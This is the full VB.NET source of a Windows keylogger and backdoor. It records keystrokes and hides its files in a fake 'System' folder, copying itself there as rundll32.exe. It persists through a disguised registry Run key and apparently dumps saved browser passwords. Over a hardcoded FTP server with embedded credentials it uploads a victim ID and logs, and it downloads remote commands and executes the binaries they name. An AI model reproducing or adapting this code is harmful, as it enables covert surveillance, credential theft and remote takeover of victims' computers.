Imports EnterpriseDT.Net.Ftp

Module Declarations
    Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Declare Function GetForegroundWindow Lib "user32" () As Long
    Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
    Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long

    Public server As String = "www.shanklyboys.dk"
    Public ruser As String = "shankly@shanklyboys.dk", rpass As String = "liverpool"

    Public luser As String = My.User.Name.Split("\").GetValue(1)
    Public tempdir As String = My.Computer.FileSystem.SpecialDirectories.Temp
    Public directory As String = Mid(tempdir, 1, Len(tempdir) - 4) & "System"
    Public apppath As String = Application.StartupPath
    Public exepath As String = Application.ExecutablePath
    Public uid As String
    Public com As String = ""
    Public idexist As Boolean = False
    Public comrun As Boolean

    Public sSave, sold As String
    Dim Cnt As Long


    Sub init()
        first_run()
    End Sub

    Sub savelog(ByVal text As String)
        Dim dt, shortfile, logfile As String
        dt = Now.Year & Now.Month & Now.Day & Now.Hour & Now.Minute & Now.Second
        shortfile = luser & dt & ".xml"
        logfile = directory & "\" & shortfile
        My.Computer.FileSystem.WriteAllText(logfile, text, True)
    End Sub

    Function GetPressedKey() As String
        For Cnt = 32 To 128
            'Get the keystate of a specified key
            If GetAsyncKeyState(Cnt) <> 0 Then
                GetPressedKey = Cnt
                Exit For
            End If
        Next Cnt
        'Return ""
    End Function

    Function upload(ByVal laddr As String, ByVal raddr As String) As Boolean
        Try
            Dim ftp As New FTPConnection
            ftp.ServerAddress = server
            ftp.UserName = ruser
            ftp.Password = rpass
            ftp.Connect()
            ftp.TransferType = FTPTransferType.BINARY
            ftp.UploadFile(laddr, raddr)
            ftp.Close()
            upload = True
        Catch ex As Exception
            upload = False
        End Try

    End Function

    Function download(ByVal laddr As String, ByVal raddr As String) As Boolean
        Try
            Dim ftp As New FTPConnection
            ftp.ServerAddress = server
            ftp.UserName = ruser
            ftp.Password = rpass
            ftp.Connect()
            ftp.TransferType = FTPTransferType.BINARY
            ftp.DownloadFile(laddr, raddr)
            ftp.Close()
            download = True
        Catch ex As Exception
            download = False
        End Try

    End Function

    Function rfile_exist(ByVal filename As String) As Boolean
        Try
            Dim ftp As New FTPConnection
            ftp.ServerAddress = server
            ftp.UserName = ruser
            ftp.Password = rpass
            ftp.Connect()
            ftp.TransferType = FTPTransferType.BINARY
            If ftp.GetSize(filename) = 0 Then
                Return False
            Else
                Return True
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function

    Sub execute_com()
        Try
            Dim ftp As New FTPConnection
            ftp.ServerAddress = server
            ftp.UserName = ruser
            ftp.Password = rpass
            ftp.Connect()
            ftp.TransferType = FTPTransferType.BINARY

            Dim comsize As Int16 = 0
            comsize = ftp.GetSize("com_" & uid & ".dll")

            If My.Computer.FileSystem.FileExists(directory & "\com.dll") Then
                If comsize = My.Computer.FileSystem.GetFileInfo(directory & "\com.dll").Length Or comsize = 0 Then
                    If comrun = False And com <> "" Then run(com)
                    ftp.Close()
                    Exit Sub
                End If
            End If

            download(directory & "\com.dll", "com_" & uid & ".dll")
            com = My.Computer.FileSystem.ReadAllText(directory & "\com.dll")
            If run(com) = True Then
                My.Computer.FileSystem.DeleteFile(directory & "\com.dll")
                comrun = True
            End If

        Catch ex As Exception

        End Try
    End Sub

    Function run(ByVal com As String) As Boolean
        Dim len As Int16, i As Int16
        len = com.Length
        Dim comlist() As String
        Try
            comlist = Split(com, vbCrLf)
            len = comlist.Length
            For i = 0 To len - 1
                Select Case comlist(i)
                    Case "stop"
                        Form1.keyTimer.Enabled = False
                    Case "start"
                        Form1.keyTimer.Enabled = True
                    Case Else
                        If comlist(i).StartsWith("run") = True Then
                            Dim l2 As String = comlist(i).Split(" ").GetValue(1)
                            download(directory & "\" & l2, l2)
                            Shell(directory & "\" & l2)
                        End If
                End Select
                run = True

            Next
        Catch ex As Exception
            run = False
        End Try

    End Function

    Sub first_run()
        Dim dt As String, dtuser As String
        dt = Now.Year & Now.Month & Now.Day & Now.Hour & Now.Minute & Now.Second
        dtuser = luser & dt

        If My.Computer.FileSystem.DirectoryExists(directory) = False Then My.Computer.FileSystem.CreateDirectory(directory)
        If My.Computer.FileSystem.FileExists(directory & "\id.dll") = True Then
            uid = My.Computer.FileSystem.ReadAllText(directory & "\id.dll")
        Else

            uid = dtuser
            My.Computer.FileSystem.WriteAllText(directory & "\id.dll", uid, False)
        End If

        If apppath <> directory Then
            Try
                With My.Computer.FileSystem
                    If .GetFileInfo(directory & "\rundll32.exe").Exists = False Then .CopyFile(exepath, directory & "\rundll32.exe")
                    .CopyFile(apppath & "\edtFTPnet.dll", directory & "\edtFTPnet.dll")
                    Dim regKey As Microsoft.Win32.RegistryKey
                    regKey = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                    If Trim(regKey.GetValue("Igfxprm")) = "" Then regKey.SetValue("Igfxprm", directory & "\rundll32.exe", Microsoft.Win32.RegistryValueKind.String)
                    regKey.Close()
                    If My.Computer.FileSystem.FileExists(apppath & "\wbpv.dll") Then
                        Shell(apppath & "\wbpv.dll /stext ft.qut")
                        .MoveFile(apppath & "\ft.qut", directory & "\" & uid & "ft.qut")
                        .CopyFile(apppath & "\edtFTPnet.dll", directory & "\edtFTPnet.dll")


                    End If
                    If rfile_exist("id_" & uid & ".dll") = False Then
                        If upload(directory & "\id.dll", "id_" & uid & ".dll") Then idexist = True
                    End If

                End With
            Catch ex As Exception

            End Try
        End If
    End Sub
End Module
